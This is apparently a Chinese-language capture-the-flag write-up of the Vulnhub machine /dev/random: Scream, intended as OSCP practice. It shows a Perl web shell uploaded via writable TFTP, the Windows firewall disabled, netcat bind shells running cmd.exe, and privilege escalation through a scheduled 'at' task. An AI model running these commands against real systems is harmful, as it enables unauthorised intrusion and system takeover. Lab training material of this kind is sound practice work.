# Vulnhub靶机 /dev/random: Scream：tftp利用，perl木马上传，windows nc正向shell连接，at命令提权-先知社区

> **来源**: https://xz.aliyun.com/news/16597  
> **文章ID**: 16597

---

靶场突破边界的方法主要是utp中的tftp协议，然后通过tftp上传perl木马，上传nc.exe进行正向shell连接。

最后的windows提权，是通过at命令配合nc正向连接提权，整体难度简单偏上

​

由于oscp+考试msf只能使用一次，所以这里并没有涉及msf的使用，不然msf反弹shell会根据方便，并且也可以利用msf生成.exe文件进行服务劫持提权

​

靶机下载地址：

```
https://www.vulnhub.com/entry/devrandom-scream,47/
```

不过给的是.exe文件，需要自己进行镜像制作  
![](images/202501232342400.png)  
我给大家提供了镜像文件和打包好的vm文件

```
https://pan.quark.cn/s/4f1ab6200007
```

![](images/202501232352067.png)

* 攻击机IP：192.168.66.128 kali2024.4
* 靶机：192.168.66.132 DevRandom\_Scream

# nmap

先进行nmap扫描，空闲时间去查看一下web页面

## 主机发现

得到靶机ip地址为：192.168.66.132

```
─# nmap -sn 192.168.66.0/24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-23 16:22 CST
Nmap scan report for 192.168.66.1 (192.168.66.1)
Host is up (0.00035s latency).
MAC Address: 00:50:56:C0:00:08 (VMware)
Nmap scan report for 192.168.66.2 (192.168.66.2)
Host is up (0.00023s latency).
MAC Address: 00:50:56:F2:C6:98 (VMware)
Nmap scan report for 192.168.66.132 (192.168.66.132)
Host is up (0.00041s latency).
MAC Address: 00:0C:29:5F:2C:6C (VMware)
Nmap scan report for 192.168.66.254 (192.168.66.254)
Host is up (0.00034s latency).
MAC Address: 00:50:56:E2:6D:97 (VMware)
Nmap scan report for 192.168.66.128 (192.168.66.128)
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 1.96 seconds

```

## 端口扫描

发现开放了：21,22,23,80和udp的69端口

```
└─# nmap --min-rate 10000 -p- 192.168.66.132         
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-23 16:25 CST
Nmap scan report for 192.168.66.132 (192.168.66.132)
Host is up (0.00091s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
23/tcp open  telnet
80/tcp open  http
MAC Address: 00:0C:29:5F:2C:6C (VMware)

Nmap done: 1 IP address (1 host up) scanned in 13.43 seconds

└─# nmap -sU -p- --min-rate 10000 192.168.66.132    
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-23 18:15 CST
Nmap scan report for 192.168.66.132 (192.168.66.132)
Host is up (0.0049s latency).
Not shown: 65534 open|filtered udp ports (no-response)
PORT   STATE SERVICE
69/udp open  tftp
MAC Address: 00:0C:29:5F:2C:6C (VMware)

Nmap done: 1 IP address (1 host up) scanned in 13.56 seconds

```

## 详细端口扫描

发现ftp匿名登录

```
└─# nmap -sV -sT -sC -O -p21,22,23,80 192.168.66.132
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-23 16:27 CST
Nmap scan report for 192.168.66.132 (192.168.66.132)
Host is up (0.00075s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     WAR-FTPD 1.65 (Name Scream XP (SP2) FTP Service)
|_ftp-bounce: bounce working!
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x 1 ftp ftp              0 Jan 23 03:27 bin
| drwxr-xr-x 1 ftp ftp              0 Jan 23 03:27 log
|_drwxr-xr-x 1 ftp ftp              0 Jan 23 03:27 root
22/tcp open  ssh     WeOnlyDo sshd 2.1.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 2c:23:77:67:d3:e0:ae:2a:a8:01:a4:9e:54:97:db:2c (DSA)
|_  1024 fa:11:a5:3d:63:95:4a:ae:3e:16:49:2f:bb:4b:f1:de (RSA)
23/tcp open  telnet
| fingerprint-strings: 
|   GenericLines, NCP, RPCCheck, tn3270: 
|     Scream Telnet Service
|     login:
|   GetRequest: 
|     HTTP/1.0
|     Scream Telnet Service
|     login:
|   Help: 
|     HELP
|     Scream Telnet Service
|     login:
|   SIPOptions: 
|     OPTIONS sip:nm SIP/2.0
|     Via: SIP/2.0/TCP nm;branch=foo
|     From: <sip:nm@nm>;tag=root
|     <sip:nm2@nm2>
|     Call-ID: 50000
|     CSeq: 42 OPTIONS
|     Max-Forwards: 70
|     Content-Length: 0
|     Contact: <sip:nm@nm>
|     Accept: application/sdp
|     Scream Telnet Service
|_    login:
80/tcp open  http    Tinyweb httpd 1.93
|_http-server-header: TinyWeb/1.93
|_http-title: The Scream - Edvard Munch
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port23-TCP:V=7.94SVN%I=7%D=1/23%Time=6791FD68%P=x86_64-pc-linux-gnu%r(N
SF:ULL,12,"\xff\xfb\x01\xff\xfe"\xff\xfe\0\xff\xfd\x03\xff\xfd\x18\xff\xf
SF:d\x1f")%r(GenericLines,34,"\xff\xfb\x01\xff\xfe"\xff\xfe\0\xff\xfd\x03
SF:\xff\xfd\x18\xff\xfd\x1f\r
\r
Scream\x20Telnet\x20Service\r
login:\x
SF:20")%r(tn3270,3C,"\xff\xfb\x01\xff\xfe"\xff\xfe\0\xff\xfd\x03\xff\xfd\
SF:x18\xff\xfd\x1f\xff\xfc\x18\xff\xfe\x19\xff\xfc\x19\xff\xfb\0Scream\x20
SF:Telnet\x20Service\r
login:\x20")%r(GetRequest,42,"\xff\xfb\x01\xff\xfe
SF:"\xff\xfe\0\xff\xfd\x03\xff\xfd\x18\xff\xfd\x1fGET\x20/\x20HTTP/1\.0\r
SF:
\r
Scream\x20Telnet\x20Service\r
login:\x20")%r(RPCCheck,5C,"\xff\x
SF:fb\x01\xff\xfe"\xff\xfe\0\xff\xfd\x03\xff\xfd\x18\xff\xfd\x1f\x80\0\0\
SF:(r\xfe\x1d\x13\0\0\0\0\0\0\0\x02\0\x01\x86\xa0\0\x01\x97\|\0\0\0\0\0\0\
SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0Scream\x20Telnet\x20Service\r
login:\x20")%
SF:r(Help,36,"\xff\xfb\x01\xff\xfe"\xff\xfe\0\xff\xfd\x03\xff\xfd\x18\xff
SF:\xfd\x1fHELP\r
Scream\x20Telnet\x20Service\r
login:\x20")%r(SIPOption
SF:s,10F,"\xff\xfb\x01\xff\xfe"\xff\xfe\0\xff\xfd\x03\xff\xfd\x18\xff\xfd
SF:\x1fOPTIONS\x20sip:nm\x20SIP/2\.0\r
Via:\x20SIP/2\.0/TCP\x20nm;branch=
SF:foo\r
From:\x20<sip:nm@nm>;tag=root\r
To:\x20<sip:nm2@nm2>\r
Call-ID
SF::\x2050000\r
CSeq:\x2042\x20OPTIONS\r
Max-Forwards:\x2070\r
Content-
SF:Length:\x200\r
Contact:\x20<sip:nm@nm>\r
Accept:\x20application/sdp\r
SF:
\r
Scream\x20Telnet\x20Service\r
login:\x20")%r(NCP,31,"\xff\xfb\x0
SF:1\xff\xfe"\xff\xfe\0\xff\xfd\x03\xff\xfd\x18\xff\xfd\x1f\x13Scream\x20
SF:Telnet\x20Service\r
login:\x20");
MAC Address: 00:0C:29:5F:2C:6C (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2000|XP|2003 (93%)
OS CPE: cpe:/o:microsoft:windows_2000::sp4 cpe:/o:microsoft:windows_xp::sp2 cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_server_2003
Aggressive OS guesses: Microsoft Windows 2000 SP4 or Windows XP SP2 or SP3 (93%), Microsoft Windows XP SP2 (93%), Microsoft Windows XP SP2 or Windows Small Business Server 2003 (92%), Microsoft Windows 2000 SP4 (91%), Microsoft Windows XP SP3 (91%), Microsoft Windows 2000 (90%), Microsoft Windows XP SP2 or SP3 (90%), Microsoft Windows 2000 SP0 (87%), Microsoft Windows XP SP2 or Windows Server 2003 (87%), Microsoft Windows Server 2003 (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.68 seconds

```

## vuln扫描

没有什么收获

```
└─# nmap --script=vuln -p21,22,23,80 192.168.66.132
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-23 16:34 CST
Stats: 0:05:20 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.95% done; ETC: 16:39 (0:00:03 remaining)
Nmap scan report for 192.168.66.132 (192.168.66.132)
Host is up (0.0011s latency).

PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
23/tcp open  telnet
80/tcp open  http
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
MAC Address: 00:0C:29:5F:2C:6C (VMware)

Nmap done: 1 IP address (1 host up) scanned in 373.33 seconds
```

# 信息收集

先看tcp端口

## web页面，80

![](images/202501232154301.png)  
查看源码没有发现什么敏感信息，目录扫描也没有收获

通过指纹识别，发现80端口没有什么服务

```
whatweb http://192.168.66.132/
```

![](images/202501231851344.png)

## ftp，21

namp扫描出来有匿名登录

```
ftp-anon: Anonymous FTP login allowed (FTP code 230)
```

没有权限，不过发现root目录存在index.html文件，猜测是网站根目录  
![](images/202501231650688.png)  
![](images/202501231653108.png)

## ssh，22

nmap扫描出来

```
22/tcp open  ssh     WeOnlyDo sshd 2.1.3 (protocol 2.0)
```

搜索一下历史漏洞，存在身份绕过漏洞，尝试利用  
![](images/202501231741696.png)  
ssh版本太老了，连接非常麻烦

```
ssh -l root 192.168.66.132 -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa -oCiphers=+3des-cbc
```

![](images/202501231738616.png)  
然后发现还是需要输入密码，失败

## tftp，utp 69

nmap扫描发现

```
69/udp open  tftp
```

> TFTP（Trivial File Transfer Protocol，简单文件传输协议）是一个用来在客户端与服务器之间进行简单文件传输的协议，提供不复杂、开销不大的文件传输服务，它只能从服务器上获得或写入文件。  
> TFTP承载在UDP之上，端口号69   
> TFTP仅提供简单的文件传输功能（上传、下载）

命令：

```
 put 上传文件
 get 下载文件
 binary 二进制传输命令，传输模式切换为binary，和ftp类似
 quit 退出
```

我们尝试上传一个文件试试

```
tftp 192.168.66.132
```

权限不够，不能下载文件  
![](images/202501231844665.png)  
登录ftp，发现文件在root目录下面

![](images/202501231838703.png)  
可以通过80端口访问  
![](images/202501231845331.png)

# 漏洞利用

## perl木马上传

不过之前通过ftp发现了cgi-bin，`/cgi-bin/`目录用来存放gui程序，可以上传一个GUI的perl木马，找到了一个

```
https://github.com/rafalrusin/web-shell
```

使用时需要加上密码是：yourpassword，即：web-shell.pl?password=yourpassword  
上传一下  
![](images/202501231924389.png)  
访问，使用dir命令验证一下，可以使用  
![](images/202501231940782.png)

检测一下是否开启防火墙

```
netsh firewall show state
```

发现得到

```
Operational mode = Enable
```

表示防火墙是开启状态  
![](images/202501231942641.png)  
关闭一下防火墙

```
net stop sharedaccess
```

![](images/202501231945471.png)  
可以使用ping命令进行测试：上面是没有关闭防火墙，发现ping不通，关闭之后就能ping通了

```
ping 192.168.66.132 -c 10
```

![](images/202501231946220.png)

## 正向shell连接

下载一下nc

```
https://eternallybored.org/misc/netcat/
```

![](images/202501232059799.png)

上传

```
└─# tftp 192.168.66.132
tftp> binary                       
tftp> put nc.exe cgi-bin/nc.exe
```

执行

```
nc -lvvp 7777 -e C:\Windows\System32\cmd.exe

# kali连接上去
nc 192.168.66.132 7777
```

成功反弹shell  
![](images/202501232100745.png)

# 提权

查看一下当前用户名和权限，用户名：

```
echo %username%
tasklist /V | findstr "tasklist"                                       
```

![](images/202501232159639.png)  
查看用户列表和主机名

```
net user
```

![](images/202501232202018.png)  
查看操作系统信息总览

```
systeminfo
```

![](images/202501232204586.png)  
查看用户的权限，发现是 Administrators 组的成员，本身权限就很高了

```
net user alex
```

![](images/202501232206437.png)

## at命令提权

既然是Administrators 组的成员，一般就可以使用at命令，而at命令一般都是管理员创建运行的，即：通过at命令执行的程序，一般都可以获取最高权限

### 正向shell连接

之前我们上传了nc.exe，现在只需要利用at命令设置一个定时任务，执行nc命令即可，创建一个.bat脚本，命名为：bat.bat

```
@echo off
c:\www\root\cgi-bin
c.exe -lvvp 4444 -e C:\Windows\System32\cmd.exe
```

上传上去

```
binary
put bat.bat
```

查看一下  
![](images/202501232213335.png)  
设置定时任务，往后一两分钟即可

```
at 21:39 "c:\www\root\bat.bat"
```

时间一到，使用kali连接

```
nc 192.168.66.132 4444
```

![](images/202501232216314.png)  
查看一下权限，提权成功

```
tasklist /V | findstr "tasklist"
```

![](images/202501232217785.png)

对于msf的使用，利用msf生成.exe文件进行服务劫持提权，网上面有一些内容了，我就不写了，可以参考  
<https://juejin.cn/post/7299050263745953833>
